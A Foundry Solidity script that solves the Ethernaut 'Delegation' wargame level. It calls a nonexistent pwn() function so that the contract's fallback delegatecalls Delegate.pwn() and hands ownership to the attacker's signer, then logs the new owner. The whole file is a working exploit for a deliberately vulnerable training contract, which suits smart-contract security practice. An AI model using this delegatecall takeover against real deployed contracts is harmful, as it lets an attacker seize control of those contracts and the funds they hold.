// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IDelegation } from "ethernaut/06-delegation/IDelegation.sol";

contract DelegationScript is Script {
    event DelegationOwner(address owner);

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address delegationAddr = vm.envAddress("L06_DELEGATION_ADDRESS");
        IDelegation delegation = IDelegation(delegationAddr);

        // Step 1: sall `Delegation.pwn()` (this method does not exist), which will trigger the `fallback()` and execute
        // `Delegate.pwn()` in the `Delegation` storage.
        delegation.pwn();

        emit DelegationOwner(delegation.owner());

        vm.stopBroadcast();
    }
}
